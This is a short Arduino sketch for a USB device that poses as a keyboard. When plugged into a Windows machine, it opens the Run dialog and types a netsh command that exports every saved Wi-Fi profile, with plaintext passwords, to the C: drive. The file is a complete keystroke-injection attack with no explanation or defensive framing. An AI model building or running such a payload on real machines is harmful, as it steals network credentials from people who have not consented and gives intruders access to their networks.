#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("cmd /T:01 /K \"netsh wlan export profile key=clear folder=C:\\ & exit\"");
  Keyboard.println("color 4A");
}

void loop() {}
